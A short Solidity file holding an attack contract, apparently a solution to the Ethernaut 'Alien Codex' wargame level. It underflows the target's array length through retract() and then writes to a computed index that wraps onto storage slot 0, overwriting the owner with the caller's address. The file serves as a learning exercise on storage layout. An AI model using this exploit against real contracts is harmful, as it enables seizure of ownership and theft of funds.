// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAlien{ // 1) change interface name

     function makeContact() external;
     function retract() external;
     function revise(uint256 i, bytes32 _content) external;
     function owner() external returns (address);

}

contract AlienAttack { // 2) change nameattck

    IAlien target;

    constructor(address _target) {
        target = IAlien(_target);
    }

    function attack() external {

        // address me = address(msg.sender);
        target.makeContact();
        target.retract();
        bytes32 slot = keccak256(abi.encode(1));
        uint256 i = type(uint256).max - uint256(slot) + 1;
        target.revise(i, bytes32(uint256(uint160(msg.sender))));

    }
}